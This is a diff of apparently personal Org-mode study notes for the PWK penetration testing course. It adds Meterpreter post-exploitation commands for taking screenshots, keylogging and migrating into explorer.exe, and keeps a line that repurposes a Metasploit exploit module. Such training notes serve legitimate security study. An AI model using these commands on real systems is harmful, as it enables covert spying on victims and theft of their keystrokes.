@@ -2774,8 +2774,32 @@ sudo mkdir -p ~/.msf4/modules/exploits/windows/http
 sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb ~/.msf4/modules/exploits/windows/http/syncbreeze.rb
    #+end_src
    
-** Post-Exploitation with Metasploit (PWK 711)
+** Post-Exploitation with Metasploit (PWK 711) (meterpreter features)
+   + info:
+     - use =help= regularly in meterpreter
+   + src:
+   #+begin_src meterpreter
+meterpreter > screenshot
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+   #+end_src
+     - since some actions (e.g. keylogging) are sensitive to the user context (e.g. a specific user) of the current session, migration to different user context is sometimes necessary.
+     - since the meterpreter payload is *executed inside the process of the application* we attack. If the process is closed, connection is closed as well. (PWK p712)
    
+*** Migrating Processes
+    + info:
+      - =migrate=
+    + src:
+    #+begin_src meterpreter
+meterpreter > ps
+  # PID PPID Name ...
+  # 3568 1960 explorer.exe ...
+meterpreter > migrate 3568
+    #+end_src
+      - migrate target can only be the other process at the same or lower privilege level.
+        
+*** Post-Exploitation Modules
 
 * TODO list
   + AD, LDAP enum users
